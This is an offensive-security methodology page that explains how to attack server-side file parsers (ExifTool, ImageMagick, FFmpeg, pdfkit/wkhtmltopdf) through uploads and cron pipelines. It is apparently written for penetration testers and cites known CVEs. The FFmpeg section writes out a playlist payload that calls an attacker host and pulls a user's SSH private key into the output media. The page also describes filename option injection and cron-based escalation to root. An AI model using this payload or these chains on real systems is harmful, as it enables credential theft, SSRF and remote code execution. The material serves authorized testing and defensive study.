---
technology: "File-processing services"
kind: overview
audience: offensive-security
family: web-platforms
role: area-router
layer: server-side media/document parsing (ExifTool, ImageMagick, FFmpeg, PDF generators; upload endpoints + cron scripts)
status: confirmed
provenance: "corpus-grounded (strict command-context gate 2026-11-12: exiftool 13 file matches of which target-side attack chains confirmed in 4 plus crafting-class usage in 2; imagemagick 8 matches of which target-side attack chains in 5; ffmpeg 2; pdfkit 2 — ffmpeg and pdfkit stay sections per the 1-2-file rule; loose vs strict counts in internal coverage ledger) + upstream-verified (CVE-2021-22204, CVE-2022-23935, CVE-2022-44268, CVE-2020-29599, CVE-2024-41817, CVE-2022-25765, FFmpeg concat protocol docs). Router/dispatch page; implementation pages: [[file-processing-exiftool]], [[file-processing-imagemagick]]. Enrichment pass 2 new-unit wave A, 2026-11-12."
---

# File-processing services (area router)

> Every "upload a file, we'll make it pretty" endpoint is a parser boundary: one attacker-crafted file crossing into a C library, a shell pipeline, or a document converter — and the parser, not the app, decides what code runs.

## What it is

A file-processing service is any endpoint or scheduled script that ingests an
attacker-supplied file and hands it to a parsing or conversion engine — **ExifTool**
(metadata in images and documents), **ImageMagick** (`convert`/`magick`/`identify` and
their bindings), **FFmpeg** (video/audio transcoding), and PDF generators
(**pdfkit**/wkhtmltopdf-style HTML-to-PDF). The application layer is usually a thin
wrapper; the security boundary lives inside a library that was written to read files,
not to distrust them.

Two deployment shapes dominate, and both matter to you: the **upload-and-convert web
endpoint** (avatar processors, report generators, "optimize your image" SaaS), and
the **cron/daemon pipeline** that walks an uploads directory on a schedule. The cron
shape is quieter and often runs privileged — a file dropped into a watched directory
is executed minutes later with no request ever hitting your payload.

The operator takeaway: fingerprint *which parser* sits behind the upload, because the
exploits are parser-specific — an ImageMagick payload does nothing to ExifTool and
vice versa — but the *chain shape* is universal: upload → parse → code/read.

## The anatomy that matters on an engagement

    attacker file → upload endpoint (validation theater: extension/MIME checks)
        → parser invoked (exiftool | convert/magick | ffmpeg | wkhtmltopdf)
            ├─ metadata blocks     → deserialization/eval bugs (ExifTool DjVu)
            ├─ delegates/coders    → shellouts to helper binaries (ImageMagick, ffmpeg concat)
            ├─ filename            → option/argument injection (leading dash, pipes)
            └─ output written      → arbitrary write primitives
        → result: RCE, arbitrary file read, or arbitrary file write

Three structural properties drive most findings:

- **The upload→parse→RCE pattern**: the file's *content* (metadata blocks, playlist
  directives, embedded profiles) and *name* (option-looking strings, pipe
  characters) are both code-injection channels into the parser's C or shell layer.
  App-side validation checks what the file claims to be; the parser executes what
  the file *is*.
- **Delegation is everywhere.** ImageMagick shells out to Ghostscript and other
  helpers by config file; FFmpeg's protocol handlers (`concat`, `subfile`) read
  local paths; PDF generators execute a browser engine. Each delegation is a chance
  for attacker-controlled input to reach a command line.
- **Cron pipelines amplify.** A scheduled `identify_images.sh`-style script or an
  automated cleanup task that processes uploads as root converts any parser bug —
  or any weak path handling in the script itself — into scheduled root execution.

## Fingerprint / dispatch table

| You observe | Parser | Go to |
|---|---|---|
| Metadata echoed in responses ("Artist", "Producer", EXIF fields); report/forensics features; ExifTool version strings in output | ExifTool | [[file-processing-exiftool\|ExifTool methodology]] |
| `convert`/`magick`/`identify` on the host, `/etc/ImageMagick-*/policy.xml`, resize/crop/thumbnail features, Ghostscript present | ImageMagick | [[file-processing-imagemagick\|ImageMagick methodology]] |
| Video transcode endpoints, HLS/m3u8 handling, AVI uploads, "FMP4" codec strings in output files | FFmpeg | Section below |
| Ruby stack (X-Runtime header, Passenger), PDF download endpoints, "Creator: pdfkit" metadata in output PDFs, wkhtmltopdf in process lists | pdfkit / wkhtmltopdf | Section below |

Fingerprint moves that work pre-exploitation: submit a file with a marked metadata
field and see it reflected (parser identified); inspect a generated PDF's metadata
(ExifTool locally — the `Creator` tag names the generating library and version);
watch for image-derivatives (thumbnails prove an image pipeline exists).

## Protocol-common: the upload→parse→RCE pattern

1. **Prove the parse.** Get *any* reflection: uploaded image's metadata echoed in a
   page, resized derivative produced, PDF metadata showing a generator. No parse,
   no parser bug.
2. **Version the engine.** Reflected metadata often carries tool versions
   ("ExifTool Version Number", `magick --version` output styles, "Creator: pdfkit
   v0.8.6"). The version gates the CVE — and generators embed it by default.
3. **Attack the content channel** — DjVu/EXIF payloads for ExifTool, PNG `tEXt`
   profile tricks and delegate abuse for ImageMagick, playlist directives for
   FFmpeg, URL structures for HTML-to-PDF.
4. **Attack the name channel** — filenames beginning with `-` become options
   (argument injection), and shell-invoked parsers treat `|` and spaces in names as
   syntax.
5. **If content fails, hunt the cron** — the uploads directory is often processed by
   a scheduled script with weaker hygiene than the web app (relative paths, `cd`
   assumptions, `find`+`rm` pipelines).

## FFmpeg — playlists as read primitives (section)

FFmpeg's URL/protocol layer is the attack surface: an uploaded *playlist* is parsed
by FFmpeg itself, and its directives name **resources** — including local files.

- **HLS/m3u8 `concat` + `subfile` file read**: craft a `.m3u8` (or AVI with an
  embedded GAB2 HLS subtitle track — both shapes observed in the field) whose
  `concat:` entry points at an attacker HTTP server hosting a second playlist, which
  uses `subfile,,start,,end,,,:` to slice a local file
  (`concat:http://ATTACKER_IP/header.m3u8|subfile,,start,1,end,10000,,:/home/user/.ssh/id_rsa`).
  FFmpeg concatenates the local file's bytes into the *output* media — export the
  result and the file rides out inside it. The canonical write-up of the technique
  is an old HackerOne FFmpeg SSRF report; it still works wherever uploads reach an
  FFmpeg that accepts playlists.
- **SSRF variant**: the same `concat:http://…` machinery makes FFmpeg fetch URLs —
  an internal-request primitive (cloud metadata endpoints, internal HTTP services)
  from a video upload feature.
- **Codec-as-oracle**: generated files' codec metadata (an "FMP4" marker in a
  downloaded file) fingerprints FFmpeg as the producer before you commit to
  playlist payloads.
- Gate note: this is a thin unit — where it appears, it appears as exactly the
  pattern above; deep FFmpeg codec fuzzing has no place in a field methodology.

## pdfkit / wkhtmltopdf — HTML-to-PDF command injection (section)

- **CVE-2022-25765** (upstream-verified; pdfkit < 0.8.7.2): the Ruby pdfkit gem
  passes the render URL to wkhtmltopdf unsafely — specially crafted URLs (nested
  quote/option structures appended to the request's URL parameter) inject command
  line arguments and reach shell execution. One observed chain: a URL-to-PDF web app
  on a Ruby/Passenger stack, `X-Runtime` header betraying Ruby, output PDF metadata
  reading "Creator: pdfkit v0.8.6" — version confirms, payload in the URL field,
  command execution as the web user.
- **Server-side wkhtmltopdf generally**: where a target's own scripts run
  `wkhtmltopdf input output` over attacker-influenced input files (report
  generators, scan-to-PDF features), the HTML engine fetches what the HTML
  references — embedded `file://` and `http://` links inside submitted content are
  local-file-read and SSRF channels into the PDF body, and unsanitized filenames
  flow into shell command lines.
- **PDF metadata as fingerprint**: `exiftool` on any generated PDF shows the
  producer/creator strings — pdfkit versions, wkhtmltopdf versions, dompdf names.
  (Cross-ref [[file-processing-exiftool]] — the same metadata lens, attacker side.)

## Where you'll meet it

- **Image-adjacent web apps**: avatar/upload processors, screenshot services,
  galleries with resize/crop features — ImageMagick territory, sometimes reachable
  through PHP bindings rather than the CLI.
- **Document services**: forensics/report generators ("upload an image, get an
  analysis"), HTML-to-PDF invoices, resume builders.
- **Media platforms**: transcode endpoints, thumbnailers for video — FFmpeg shapes.
- **Scheduled pipelines**: cleanup scripts and derivative generators walking
  uploads directories as root — the parse happens on a timer, not on a request.
- **Privesc context**: a parser bug as a low-priv user is often just the foothold;
  the same box's cron scripts and SUID/ sudo wrappers around parsers are the
  elevation.

## Reading the platform's mind

1. **Generated files confess their generator** — PDF/image derivatives embed the
   producing library and version by default; collect outputs before submitting
   anything.
2. **Validation checks claims, parsers execute content** — extension and MIME
   checks filter nothing that matters; craft the *inside* of a valid file.
3. **Filename → command line** is a recurring disease: every `-`-prefixed name is
   an option injection candidate against every CLI parser.
4. **Delegation configs are readable once you land** — `policy.xml`,
   `delegates.xml`, ffmpeg protocol lists: read them before choosing the next
   payload.
5. **Cron turns parser bugs into root bugs** — enumerate what touches the uploads
   directory and as whom.

## Where to go next

[[file-processing-exiftool|ExifTool]] — DjVu deserialization RCE, filename command
injection, metadata-as-delivery-vehicle chains. [[file-processing-imagemagick|ImageMagick]] —
PNG profile file reads, `-authenticate` shell injection, policy bypass, AppImage
delegate RCE. Database layer that often sits behind upload apps: [[mysql]].
